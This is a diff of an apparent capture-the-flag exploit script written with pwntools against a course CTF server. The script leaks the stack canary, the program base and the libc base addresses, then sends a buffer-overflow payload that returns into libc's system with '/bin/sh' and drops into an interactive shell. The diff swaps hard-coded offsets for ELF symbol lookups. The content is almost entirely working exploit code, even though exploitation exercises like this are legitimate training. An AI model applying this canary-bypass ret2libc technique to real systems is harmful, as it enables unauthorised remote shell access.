@@ -201,31 +201,36 @@ def leak_libc_addr(proc):
     addr = proc.recvline(keepends=False)
     proc.sendlineafter(b":", b"")
     return int(addr, 16)
-    
-r = remote("ctf-fsi.fe.up.pt", 4002)
 
+program = ELF("./program")
+libc = ELF("./libc.so.6")
+
+r = remote("ctf-fsi.fe.up.pt", 4002)
 
 canary = leak_canary(r)
 info(f"Canary leaked!\n! {hex(canary)}")
 
 main_addr = leak_main_addr(r)
-program_base_addr = main_addr - 0x000012AD
+program_base_addr = main_addr - program.symbols["main"]
 info(f"Program base address leaked!\n! {hex(program_base_addr)}")
-buffer_addr = program_base_addr + 0x00004040
+buffer_addr = program_base_addr + program.symbols["buffer"]
 
 libc_addr = leak_libc_addr(r)
-libc_base_addr = libc_addr - 0x00021519
+libc_base_addr = libc_addr - 0x00021519 # value obtained using GDB
+
 info(f"Libc base address leaked!\n! {hex(libc_base_addr)}")
-system_addr = libc_base_addr + 0x00048150
+system_addr = libc_base_addr + libc.symbols["system"]
 
 info(f"Ret addr: {hex(system_addr)}")
 info(f"Ret arg addr: {hex(buffer_addr)}")
-payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(ret_addr) + b"\0" * 4 + p32(ret_arg_addr)
+
+payload = b"A" * 20 + p32(canary) + b"\0" * 8 + p32(system_addr) + b"\0" * 4 + p32(buffer_addr)
 info(f"Payload: {payload}")
 
 r.sendlineafter(b">", b"e")
 r.sendlineafter(b":", payload)
 r.sendlineafter(b":", b"/bin/sh\0")
+r.sendlineafter(b">", b"q")
 
 r.interactive()
 ```
